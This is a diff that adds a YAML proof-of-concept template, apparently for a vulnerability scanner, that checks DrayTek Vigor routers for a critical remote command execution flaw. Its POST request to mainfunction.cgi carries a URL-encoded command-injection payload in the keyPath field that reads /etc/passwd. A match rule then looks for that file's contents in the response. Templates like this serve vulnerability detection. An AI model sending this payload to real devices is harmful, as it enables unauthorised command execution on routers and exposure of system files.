@@ -1,0 +1,20 @@
+id: poc-yaml-draytek-vigor-rce
+info:
+  name: DrayTek Vigor 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: DrayTek
+  osprey-id: vb_2020_0024
+requests:
+- method: POST
+  path: /cgi-bin/mainfunction.cgi
+  headers:
+    UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+  data: action=login&keyPath=%27%0A%2fbin%2fcat%24%7BIFS%7D%252fetc%252fpasswd%0A%27&loginUser=a&loginPwd=a
+  expression: 'status_code == 200 && contains(body, "root:") && !contains(body, "<")
+    && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
